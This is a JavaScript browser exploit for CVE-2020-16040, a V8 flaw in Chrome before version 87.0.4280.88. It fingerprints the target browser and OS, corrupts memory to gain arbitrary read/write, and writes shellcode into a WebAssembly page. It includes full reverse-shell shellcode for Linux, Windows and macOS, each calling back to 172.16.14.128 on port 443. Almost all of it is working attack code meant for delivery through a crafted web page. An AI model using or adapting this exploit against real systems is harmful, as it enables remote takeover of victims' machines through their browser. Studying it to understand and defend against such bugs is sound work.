/* 

Title: CVE-2020-16040 < 87.0.4280.88 Chrome Browser (V8 8.9.0) Exploit
Author: Jason Magic (JM5/ret2eax)

Reference(s):
	http://crbug.com/1150649
	V8 commit ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92 (patch)

SL's VisitSpeculativeIntegerAdditiveOp was setting Signed32 as
restriction type even when relying on a Word32 truncation in order to
skip the overflow check.

Because of DCL, this exploit will only be successful when integrated within a specially crafted HTML page,
this version will not work when firing against ./d8 due to function reliability required in-browser.

Not currently chained with a sandbox escape `--no-sandbox only`.

For testing, the shellcode will need to be altered to your own internal`LHOST` IP address and desired port, 
alternatively you can statically set your VM IP to `172.16.14.128` and catch the reverse shell on `tcp\443`.

TODO: Chain with Mojo IPC binding sandbox escape (CVE-2020-16041).

*/

//view console output for console.log()

//define clean exit 'abort' function
function abort(msg) {
    throw new Error(msg);
}

/*
	Dynamically loading script within browser which will enumerate the target to apply
	additional abort checks if prerequisites are not satisifed. This is also used
	to alter exploit execution flow, particularly payload delivery.
*/

//DCL
function dynamicallyLoadScript(url) {
    var script = document.createElement("script"); // create a script DOM node
    script.src = "bowser.js" // set its src to the provided URL, or local file
    document.head.appendChild(script); // add it to the end of the head section of the page (could change 'head' to 'body')
    console.log('[process] dynamic code loading for additional abort checks and execution flow');
}
console.log('[process] additional abort checks dynamically loaded');
dynamicallyLoadScript();

// event to run a callback function
function loadScript(url, callback) {
    // Adding the script tag to the head
    var head = document.head;
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = "bowser.js"; // url will only load with internet connectivity, adding source locally.

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
}

// determines whether the target browser is vulnerable, otherwise aborts with clean exit
var getChromeVersion = function() {
    var browser = bowser.getParser(window.navigator.userAgent);
    console.log('[process] determining whether target browser is vulnerable or not');

    if (browser.parsedResult.browser.name != "Chrome") {
        abort('[error] target browser is not Chrome, but rather: ' + browser.parsedResult.browser.name + ' version ' + browser.parsedResult.browser.version + ', aborting exploit.');
    } else {
        console.log('[success] target browser is Chrome');
        if (browser.satisfies({
                chrome: '>=87.0.4280.88'
            })) {
            abort('[error] target Chrome browser is not vulnerable, version in use: ' + browser.parsedResult.browser.version);
        } else {
            console.log('[success] target Chrome browser is of vulnerable version: ' + browser.parsedResult.browser.version);
            //target is vulnerable, call exploit and set timeout.
            setTimeout(exploit, 1500);
        }
    }
};

loadScript("getChromeVersion.js", getChromeVersion);

//this function performs all exploit related activity.
function exploit() {

    // Helper functions to convert between float and integer primitives
    var buf = new ArrayBuffer(8); // 8 byte array buffer
    var f64_buf = new Float64Array(buf);
    var u64_buf = new Uint32Array(buf);

    function ftoi(val) { // typeof(val) = float
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
    }

    function itof(val) { // typeof(val) = BigInt
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
        return f64_buf[0];
    }


    //trigger the vulnerability, leverages the signed integer overflow and a typer bug to attain an out-of-bounds condition
    function foo(a) {
        var y = 0x7fffffff; //INT_MAX 2147483647 (signed 32-bit)

        //Widening condition to fail the first `if` clause inside VisitSpeculativeIntegerAdditiveOp (SpecualtiveSafeIntegerAdd node).
        if (a == NaN) y = NaN;

        /*
        The next condition holds only in the warmup run. It leads to Smi
        (SignedSmall) feedback being collected for the addition below.
        (Gather type feedback)
        */

        if (a) y = -1; // gather type feedback, SignedSmall
        let z = (y + 1) | 0; //returns -2147483648 (INT_MIN of signed 32-bit)
        //should return false, but got true due to 0x80000000 wrapping to INT_MIN (-2147483648)
        z = (0x80000000 == z); //returns boolean, true or false, is z equiv to 2147483648 (which it isn't, as it is -2147483648), but the return is true when it should be false.
        if (a) z = -1; //gather type feedback, SignedSmall

	//satisfies the CheckBounds (bounds check elimination) - refer to CVE-2020-16041
	let l = Math.sign(z); 
        l = l < 0 ? 0 : l;

        /*
        The JIT compiler (TurboFan) interprets l is a + num, but it is actually a - number,
        which satisfies the usage conditions of the arr.shift(); trick.
        */

        //real value: 1, optimiser: Range(-1, 0)
        let arr = new Array(l); //new array at index length 0

        // arr.length = -1, leads to oob
        arr.shift();

        //creating cor array
        let cor = [1.1, 1.2, 1.3];
        return [arr, cor];
    }

    // JIT-compiling the foo(); function for optimisation.
    for (let i = 0; i < 0x10000; i++) //arbitrary high value to ensure optimisation
        foo(true);
    console.log('[process] forcing optimisation to trigger the bug');

    const ret = foo(false);
    var arr = ret[0];
    var cor = ret[1];

    // Make sure returned arr.length is -1, otherwise exit cleanly as would indicate a fail to attain OOB.
    if (arr.length >= 0) {
        abort('[error] failed to attain out-of-bounds, exploit failed from bad array length')
    } else {
        console.log('[success] out-of-bounds plausible, obtained a negative array length')
    }

    /*
    oob r/w functions
    */

    console.log('[process] attempting to overwrite the length of the corrupted array');

    //we use the original OOB array (arr) to corrupt the length of the 'cor' array.
    arr[16] = 0x4242; //overwrites the cor array length for OOB read (16962)

    //make sure returned cor.length has been overwritten, otherwise exit.
    if (cor.length < 16962) {
        abort('[error] failed to overwrite the length of the second array.');
    } else {
        console.log('[success] length of second array overwritten to ' + cor.length);
    }

    // leak float_array_map
    let float_array_map = ftoi(cor[3]);
    console.log(`[success] leaked corrupted array map at: 0x${float_array_map.toString(16)}`);

    //addrof primitive - takes an object and returns its address in memory.
    function addrof(obj) {
        arr[11] = obj;
        return ftoi(cor[2]);
    }

    //fakeobj primitive - create an object in memory which we can r/w to.
    function fakeobj(addr) {
        cor[2] = itof(addr);
        return arr[11];
    }

    //for arbitrary read/write
    rw_arr = [itof(float_array_map), 1.1, 1.2, 1.3]
    fake = fakeobj(addrof(rw_arr) + 0x20n); //victim object offset

    //arb_read primitive
    function arb_read(addr) {
        fake = fakeobj(addrof(rw_arr) + 0x20n); //victim object offset
        rw_arr[1] = itof((0x12n << 32n) + (addr += 1n) - 0x8n); //offset
        return ftoi(fake[0]);
    }

    //arb_write primitive
    function arb_write(addr, val) {
        fake = fakeobj(addrof(rw_arr) + 0x20n); //victim object offset
        rw_arr[1] = itof((0x12n << 32n) + (addr += 1n) - 0x8n); //offset
        fake[0] = itof(val);
        return;
    }

    //creating an rwx segment
    var wasmCode = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01,
        0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x04, 0x84, 0x80,
        0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00,
        0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02,
        0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00,
        0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41,
        0x2a, 0x0b
    ]);

    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var wasm_entry = wasmInstance.exports.main;
    console.log('[process] creating wasm instance and fetching rwx');

    // read/fetch address of the wasmInstance, apply offset to attain rwx page/segment address.
    let rwx = arb_read(addrof(wasmInstance) + 0x67n); //offset at 0x67, leaks rwx
    console.log(`[success] rwx web assembly segment at 0x${rwx}`);

    console.log('[process] staging the static payloads depending on target OS');

    //writing shellcode to rwx
    function write(buf) {
        let tmp = new ArrayBuffer(buf.length);
        let view = new DataView(tmp);
        let backing_store_addr = addrof(tmp) + 0x13n; //backingstore of victim buffer offset changed from 0x20 to 0x13
        arb_write(backing_store_addr, rwx);
        for (let i = 0; i < buf.length; i++) {
            view.setUint8(i, buf[i]);
        }
    }

    //enumerates target OS, shellcode alters depending on the targeted environment being Windows, Linux or macOS.
    var getTargetOS = function() {
        const parser = bowser.getParser(window.navigator.userAgent);
        var getTargetOS = parser.getOS();
        var getTargetOS = getTargetOS.name; //will output "Linux", "macOS" or "Windows" etc based on browser user agent

        if (getTargetOS == "Linux") {
            console.log('[process] target OS appears to be ' + getTargetOS + ', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
            //use Linux shellcode
            linuxShellcode();
        }
        if (getTargetOS == "Windows") {
            console.log('[process] target OS appears to be ' + getTargetOS + ', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
            //use Windows shellcode
            windowsShellcode();
        }
        if (getTargetOS == "macOS") {
            console.log('[process] target OS appears to be ' + getTargetOS + ', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
            //use macOS shellcode
            osxShellcode();
        } else {
            abort('[error] No current support for ' + getTargetOS + ', aborting.');
        }

        /*
		Additional support for other OS types here, as well as any architectural conditions
		to alternate between offsets and other contextual environment changes.
	*/

    };
    loadScript("getTargetOS.js", getTargetOS);


    //reverse linux tcp shell payload: 172.16.14.128 (tcp\443)
    function linuxShellcode() {
        var shellcode = new Uint8Array([
            0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a,
            0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9,
            0x02, 0x00, 0x01, 0xbb, 0xac, 0x10, 0x0e, 0x80,
            0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a,
            0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48,
            0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
            0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
            0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
            0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6,
            0x0f, 0x05
        ]);

        //write shellcode for it to be executed in memory
        write(shellcode);
        wasm_entry();
    }


    //reverse windows tcp shell payload: 172.16.14.128 (tcp\443)
    function windowsShellcode() {
        var shellcode = new Uint8Array([
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
            0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
            0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
            0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
            0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
            0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
            0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
            0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
            0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
            0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67,
            0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
            0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
            0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
            0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
            0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24,
            0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
            0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41,
            0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
            0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
            0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
            0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83,
            0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
            0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
            0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
            0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
            0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
            0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00,
            0x01, 0xbb, 0xac, 0x10, 0x0e, 0x80, 0x41, 0x54,
            0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba,
            0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89,
            0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
            0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50,
            0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
            0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0,
            0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
            0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
            0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9,
            0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
            0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49,
            0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2,
            0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d,
            0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44,
            0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24,
            0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56,
            0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
            0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d,
            0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79,
            0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31, 0xd2,
            0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08,
            0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
            0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d,
            0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06,
            0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
            0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41,
            0x89, 0xda, 0xff, 0xd5
        ]);

        //write shellcode for it to be executed in memory
        write(shellcode);
        wasm_entry();
    }

    //reverse osx tcp shell payload: 172.16.14.128 (tcp\443)
    function osxShellcode() {
        var shellcode = new Uint8Array([
            0xb8, 0x61, 0x00, 0x00, 0x02, 0x6a, 0x02, 0x5f,
            0x6a, 0x01, 0x5e, 0x48, 0x31, 0xd2, 0x0f, 0x05,
            0x49, 0x89, 0xc4, 0x48, 0x89, 0xc7, 0xb8, 0x62,
            0x00, 0x00, 0x02, 0x48, 0x31, 0xf6, 0x56, 0x48,
            0xbe, 0x02, 0x00, 0x01, 0xbb, 0xac, 0x10, 0x0e,
            0x80, 0x56, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a,
            0x0f, 0x05, 0x4c, 0x89, 0xe7, 0xb8, 0x5a, 0x00,
            0x00, 0x02, 0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00,
            0x00, 0x0f, 0x05, 0xb8, 0x5a, 0x00, 0x00, 0x02,
            0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00, 0x0f,
            0x05, 0xb8, 0x5a, 0x00, 0x00, 0x02, 0x48, 0xc7,
            0xc6, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
            0x31, 0xc0, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0xe8,
            0x09, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e,
            0x2f, 0x73, 0x68, 0x00, 0x00, 0x5f, 0x48, 0x31,
            0xd2, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
        ]);

        //write shellcode for it to be executed in memory
        write(shellcode);
        wasm_entry();
    }
}
 
